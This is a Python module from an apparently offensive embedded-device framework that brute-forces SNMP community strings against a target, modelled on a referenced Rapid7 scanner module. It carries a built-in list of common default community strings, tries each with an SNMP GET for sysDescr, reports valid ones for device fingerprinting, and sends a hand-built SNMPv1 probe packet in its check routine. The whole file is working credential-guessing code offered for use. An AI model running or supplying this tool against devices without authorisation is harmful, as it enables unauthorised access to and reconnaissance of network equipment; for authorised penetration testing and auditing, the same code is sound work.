"""SNMP community string bruteforce.

Tests a list of community strings against an SNMP-enabled device.
Supports SNMPv1 and SNMPv2c. Uses pysnmp for protocol handling.

Author: André Henrique (@mrhenrike) | União Geek  -  https://github.com/Uniao-Geek
"""

from __future__ import annotations

from typing import List

from embedxpl.core.exploit import *
from embedxpl.core.http.http_client import HTTPClient

__info__ = {
    "name": "SNMP Community String Bruteforce",
    "description": (
        "Tests a list of SNMP community strings against the target. "
        "Supports SNMPv1/v2c. Extracts sysDescr on success for device fingerprinting."
    ),
    "authors": ("André Henrique (@mrhenrike)",),
    "references": (
        "https://www.rapid7.com/db/modules/auxiliary/scanner/snmp/snmp_login/",
    ),
}

_DEFAULT_COMMUNITIES: List[str] = [
    "public", "private", "community", "admin", "manager",
    "monitor", "default", "cisco", "router", "switch",
    "secret", "password", "read", "write", "snmp",
    "network", "guest", "test", "internal", "access",
    "0", "1234", "cable-docsis", "ILMI",
]


class Exploit(HTTPClient):
    """SNMP community string bruteforce."""

    target     = OptIP("", "Target IPv4 address")
    port       = OptPort(161, "Target SNMP UDP port")
    wordlist   = OptString("", "Path to community string wordlist (empty = built-in list)")
    timeout    = OptPort(3, "UDP response timeout (seconds)")

    def _load_communities(self) -> List[str]:
        """Load community strings from wordlist or use defaults."""
        if self.wordlist:
            try:
                return [
                    line.strip() for line in open(self.wordlist)
                    if line.strip() and not line.startswith("#")
                ]
            except Exception as e:
                print_error(f"Could not load wordlist: {e}  -  using defaults")
        return _DEFAULT_COMMUNITIES

    def run(self) -> None:
        try:
            from embedxpl.core.snmp.session import SNMPSession
            from embedxpl.core.snmp.snmp_client import SNMP_IMPORT_ERROR
            if SNMP_IMPORT_ERROR is not None:
                raise ImportError(str(SNMP_IMPORT_ERROR))
        except ImportError as exc:
            print_error(f"PySNMP unavailable: {exc}")
            return

        communities = self._load_communities()
        print_status(f"Testing {len(communities)} communities on {self.target}:{self.port}")

        found = []
        for community in communities:
            try:
                with SNMPSession(str(self.target), self.port, community,
                                 timeout=self.timeout) as session:
                    error, status, _, values = session.get("1.3.6.1.2.1.1.1.0")
                if not error and not status:
                    print_success(f"VALID community: {community}")
                    if values:
                        print_success(f"sysDescr: {values[0][1]}")
                    found.append(community)
            except Exception as exc:
                print_error(f"Probe failed: {exc}")
        if not found:
            print_error("No valid communities found")

    @mute
    def check(self) -> bool:
        """Check if SNMP port is responding."""
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(int(self.timeout))
        # Minimal SNMPv1 GetRequest for sysDescr with community "public"
        pkt = bytes.fromhex(
            "302602010004067075626c6963"
            "a01902040000000002010002010030"
            "0b300906052b0601020101050000"
        )
        try:
            sock.sendto(pkt, (self.target, int(self.port)))
            data, _ = sock.recvfrom(1024)
            if data:
                print_success("SNMP port responding")
                return True
        except socket.timeout:
            print_error("No response on UDP 161")
        except Exception as e:
            print_error(f"Check error: {e}")
        finally:
            sock.close()
        return False
